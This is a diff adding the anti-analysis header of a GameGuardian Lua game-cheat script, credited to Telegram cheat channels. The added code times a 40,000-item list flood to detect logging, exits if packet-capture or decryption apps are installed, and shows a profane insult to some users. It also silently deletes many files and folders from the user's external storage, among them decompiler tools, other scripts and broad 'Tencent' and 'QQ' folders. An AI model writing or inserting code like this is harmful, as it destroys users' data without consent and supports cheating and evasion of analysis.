@@ -1,3 +1,144 @@
+-- Coded by @BydzNesiaa
+-- Channel : @tlcesports & @wtkcesports
+
+nesia = {}
+for i = 1, 40000 do -- Keep 40000 ! don't change or function not work.
+table.insert(nesia, {address = 127 + i, flags = 12, values = 127})
+end
+clock = os.clock()
+time = os.time()
+for i = 1, 6 do gg.addListItems(nesia) end
+if os.clock() - clock > 2 then
+gg.removeListItems(nesia)
+gg.alert("No Log!")
+os.exit()
+end
+if os.time() - time > 2 then
+gg.removeListItems(nesia)
+gg.alert("No Log!")
+os.exit()
+end 
+gg.removeListItems(nesia)
+
+-- Coded by @ItzXEROX
+-- Telegram : t.me/TeamBattleAxeCheats
+
+if gg.isPackageInstalled("app.greyshirts.sslcapture") then
+    print("Fuck U bitch This Script Not For U🖕\n Warn By XEROX🖕")
+    os.exit()
+  end
+
+
+if gg.isPackageInstalled("com.gxlkj.tl") then
+gg.alert("⛔Error TBC™ XEROX SECURE 🔐\n SLua Detected Logger Package : 'com.gxlkj.tl' Make sure to Delete this package to use this script")
+os.exit()
+else
+end
+if gg.isPackageInstalled("com.decrypt.revo6") then
+gg.alert("⛔Error TBC™ XEROX SECURE 🔐\n SLua Detected Logger Package : 'com.decrypt.revo6' Make sure to Delete this package to use this script")
+os.exit()
+else
+end
+if gg.isPackageInstalled("catch_.me_.if_.you_.can") then
+gg.alert("⛔Error TBC™ XEROX SECURE 🔐\n SLua Detected Forbidden Package : 'catch_.me_.if_.you_.can' Make sure to Delete this package to use this script")
+os.exit()
+else
+end
+if gg.isPackageInstalled("sstool.only.com.sstool") then
+gg.alert("⛔Error TBC™ XEROX SECURE 🔐\n SLua Detected Logger Package : 'sstool.only.com.sstool' Make sure to Delete this package to use this script")
+os.exit()
+else
+end
+if gg.isPackageInstalled("serdadu.log.revo6") then
+gg.alert("⛔Error TBC™ XEROX SECURE 🔐\n SLua Detected Logger Package : 'serdadu.log.revo6' Make sure to Delete this package to use this script")
+os.exit()
+else
+end
+if gg.isPackageInstalled("com.modeghaith.hd") then
+gg.alert("⛔Error TBC™ XEROX SECURE 🔐\n SLua Detected Logger Package : 'com.modeghaith.hd' Make sure to Delete this package to use this script")
+os.exit()
+else
+end
+if gg.isPackageInstalled("com.wtkc.gg") then
+gg.alert("⛔Error TBC™ XEROX SECURE 🔐\n SLua Detected Logger Package : 'com.wtkc.gg' Make sure to Delete this package to use this script")
+os.exit()
+else
+end
+if gg.isPackageInstalled("io.neoterm") then
+gg.alert("⚠️Warning⚠️\n 🔐 TBC™ XEROX SECURE 🔐 Security\n SLua Detected Command Package : 'io.neoterm' This package do multipes command and can decrypt script ")
+os.remove(gg.EXT_STORAGE .. "/Unluac")
+os.remove(gg.EXT_STORAGE .. "/Unluac.jar")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac.jar")
+os.remove(gg.EXT_STORAGE .. "/Unluac_2019")
+os.remove(gg.EXT_STORAGE .. "/Unluac_2019.jar")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac_2019")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac_2019.jar")
+else
+end
+if gg.isPackageInstalled("com.termux") then
+gg.alert("⚠️Warning⚠️\n 🔐 TBC™ XEROX SECURE 🔐 Security\n SLua Detected Command Package : 'com.termux' This package do multipes command and can decrypt script ")
+os.remove(gg.EXT_STORAGE .. "/Unluac")
+os.remove(gg.EXT_STORAGE .. "/Unluac.jar")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac.jar")
+os.remove(gg.EXT_STORAGE .. "/Unluac_2019")
+os.remove(gg.EXT_STORAGE .. "/Unluac_2019.jar")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac_2019")
+os.remove(gg.EXT_STORAGE .. "/Download/Unluac_2019.jar")
+else
+end
+os.remove(gg.EXT_STORAGE .. "/Decrypt.lua")
+os.remove(gg.EXT_STORAGE .. "/Revo.lua")
+os.remove(gg.EXT_STORAGE .. "/мм²⁵¹²༒Hσσк Dєтє¢тє")
+os.remove(gg.EXT_STORAGE .. "/мм²⁵¹²༒Hσσк Dєтє¢тє.lua")
+os.remove(gg.EXT_STORAGE .. "/MM2512")
+os.remove(gg.EXT_STORAGE .. "/MM2512.lua")
+os.remove(gg.EXT_STORAGE .. "/мм²⁵¹²༒.lua")
+os.remove(gg.EXT_STORAGE .. "/мм²⁵¹²༒")
+os.remove(gg.EXT_STORAGE .. "/Mayimi")
+os.remove(gg.EXT_STORAGE .. "/Ƭ𝔦ន ղ𝖖մƴҽɳ")
+os.remove(gg.EXT_STORAGE .. "/Ƭ𝔦ន ղ𝖖մƴҽɳ.lua")
+os.remove(gg.EXT_STORAGE .. "/ᴍᴜʜᴀᴍᴀᴅɢᴀᴍᴇʀ.ʟᴜᴀ")
+os.remove(gg.EXT_STORAGE .. "/Dec By Mr Joker.Lua")
+os.remove(gg.EXT_STORAGE .. "/MrVinYT")
+os.remove(gg.EXT_STORAGE .. "/[SSDECOMP]1.lua")
+os.remove(gg.EXT_STORAGE .. "/[SSDECOMP].lua")
+os.remove(gg.EXT_STORAGE .. "/SSDECOMP1LE")
+os.remove(gg.EXT_STORAGE .. "/[SSDECOMP]TBC™ XEROX SECURE 🔐.MM.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/Decrypt.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/Revo.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/мм²⁵¹²༒Hσσк Dєтє¢тє")
+os.remove(gg.EXT_STORAGE .. "/Download/мм²⁵¹²༒Hσσк Dєтє¢тє.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/MM2512")
+os.remove(gg.EXT_STORAGE .. "/Download/MM2512.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/мм²⁵¹²༒.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/мм²⁵¹²༒")
+os.remove(gg.EXT_STORAGE .. "/Download/Mayimi")
+os.remove(gg.EXT_STORAGE .. "/Download/Ƭ𝔦ន ղ𝖖մƴҽɳ")
+os.remove(gg.EXT_STORAGE .. "/Download/Ƭ𝔦ន ղ𝖖մƴҽɳ.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/ᴍᴜʜᴀᴍᴀᴅɢᴀᴍᴇʀ.ʟᴜᴀ")
+os.remove(gg.EXT_STORAGE .. "/Download/Dec By Mr Joker.Lua")
+os.remove(gg.EXT_STORAGE .. "/Download/MrVinYT")
+os.remove(gg.EXT_STORAGE .. "/Download/[SSDECOMP]1.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/[SSDECOMP].lua")
+os.remove(gg.EXT_STORAGE .. "/Download/SSDECOMP1LE")
+os.remove(gg.EXT_STORAGE .. "/Download/[SSDECOMP]TBC™ XEROX SECURE 🔐.MM.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/SSDECOMP1LE")
+os.remove(gg.EXT_STORAGE .. "/Compiler.lua")
+os.remove(gg.EXT_STORAGE .. "/Download/Compiler.lua")
+os.remove(gg.EXT_STORAGE .. "/Tencent")
+os.remove(gg.EXT_STORAGE .. "/SSDECOMP")
+os.remove(gg.EXT_STORAGE .. "/SSDECOMP1LE")
+os.remove(gg.EXT_STORAGE .. "/MrVinYT")
+os.remove(gg.EXT_STORAGE .. "/Mayimi")
+os.remove(gg.EXT_STORAGE .. "/Decrypt")
+os.remove(gg.EXT_STORAGE .. "/Revo Logger")
+os.remove(gg.EXT_STORAGE .. "/Revo 6 Logger")
+os.remove(gg.EXT_STORAGE .. "/QQ")
+os.remove(gg.EXT_STORAGE .. "/tencent")
+os.remove(gg.EXT_STORAGE .. "/ᴍᴜʜᴀᴍᴀᴅɢᴀᴍᴇʀ.ʟᴜᴀ")
+
 
 gg.setVisible(false) 
 
